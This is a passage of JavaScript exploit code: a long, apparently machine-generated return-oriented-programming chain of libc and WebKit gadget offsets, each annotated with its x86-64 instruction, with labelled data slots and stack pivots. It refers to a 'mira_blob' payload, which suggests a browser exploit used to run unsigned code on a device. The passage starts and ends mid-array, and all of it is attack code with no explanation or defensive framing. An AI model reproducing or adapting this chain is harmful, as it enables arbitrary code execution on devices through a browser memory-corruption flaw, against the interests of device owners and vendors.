libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+170192, //L2552
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+170208, //L2554
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2552:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+170368, //L2558
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+170320, //L2555
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170336, //L2556
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2555:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2556:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2557:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2558:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+170424, //L2560
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2560:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+170528, //L2561
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170560, //L2563
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170544, //L2562
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2561:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2562:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2563:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+170720, //L2567
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170672, //L2564
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170688, //L2565
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2564:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2565:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2566:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2567:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+170824, //L2569
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+170808, //L2568
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2568:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2569:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2570:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2571:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+171024, //L2574
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+170992, //L2572
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2572:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2573:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2574:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171128, //L2576
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171112, //L2575
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2575:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171240, //L2579
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+171208, //L2577
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2577:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2578:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2579:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171304, //L2580
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2580:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+171360, //L2583
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2583:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+171504, //L2585
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171520, //L2586
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+171488, //L2584
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2584:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2585:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2586:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+171680, //L2590
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+171632, //L2587
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+171648, //L2588
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2587:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2588:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2589:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2590:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+171808, //L2592
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171824, //L2593
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+171792, //L2591
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2591:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2592:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2593:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+171920, //L2594
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+171936, //L2595
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2594:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2595:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172048, //L2596
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172032, //L2597
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2597:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2596:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+172136, //L2599
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+172120, //L2598
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2598:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2599:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172232, //L2600
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172248, //L2601
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2600:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2601:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172360, //L2602
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+172344, //L2603
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2603:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2602:
db([0, 0]); // 0x0
//_main:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+172432, //L2604
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2604:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172496, //L2606
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2606:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([64, 0]); // 0x40
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172600, //L2609
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+172648, //L2611
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2609:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2608:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2610:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2611:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+172744, //L2613
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+172728, //L2612
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2612:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2613:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2614:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2615:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2616:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2617:
db([2, 0]); // 0x2
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2618:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+173056, //L2621
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2621:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2622:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2623:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+173248, //L2626
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2626:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2627:
db([4, 0]); // 0x4
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+173392, //L2630
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2630:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+173504, //L2631
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2631:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2632:
db([65536, 0]); // 0x10000
set_gadget(libc_base+206806,); //pop rdi
//L2633:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+173632, //L2635
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+173616, //L2634
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2634:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2635:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2636:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2638:
ropchain+173784, //L2637
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+201080, //L2639
//L2637:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+173872, //L2642
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2641:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2642:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2644:
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+792472, //pop rcx
//L2645:
(window.mira_blob||0),
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+793877, //pop rsi
ropchain+174000, //L2647
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2646:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2647:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2649:
ropchain+203736, //L2648
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2651:
ropchain+174152, //L2650
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+194392, //L2652
//L2650:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+174240, //L2655
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2654:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+792472,); //pop rcx
//L2655:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+174328, //L2656
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+174344, //L2658
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2656:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2658:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+174504, //L2662
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+174456, //L2659
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+174488, //L2661
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2659:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2660:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2661:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2662:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+174632, //L2664
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+174648, //L2665
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+174616, //L2663
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2663:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2664:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2665:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+174752, //L2667
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+174800, //L2670
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+174768, //L2668
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2667:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2668:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2669:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2670:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+174912, //L2671+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+174904, //L2671
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2671:
db([0, 0]); // 0x0
set_gadgets([
ropchain+174928, //L2671+24
ropchain+175384, //L2666
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+174968, //L2672
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2672:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2673:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2674:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+175120, //L2676
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175136, //L2677
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+175104, //L2675
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2675:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2676:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2677:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+175232, //L2678
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175248, //L2679
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2678:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2679:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+175360, //L2680
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175344, //L2681
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2681:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2680:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+181688, //L2682
//L2666:
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2684:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2685:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175480, //L2687
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2686:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2687:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+175536, //L2690
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2690:
db([0, 0]); // 0x0
//L2688:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+175600, //L2693
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2692:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2693:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+175688, //L2694
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175704, //L2696
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2694:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2696:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+175856, //L2698
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175888, //L2700
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+175840, //L2697
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+175872, //L2699
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2697:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2698:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2699:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2700:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+175960, //L2701
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+175976, //L2702
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2701:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2702:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176072, //L2704
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+176056, //L2703
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2703:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2704:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176152, //L2705
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2705:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2706:
db([65536, 0]); // 0x10000
set_gadget(libc_base+206806,); //pop rdi
//L2707:
db([65536, 0]); // 0x10000
set_gadgets([
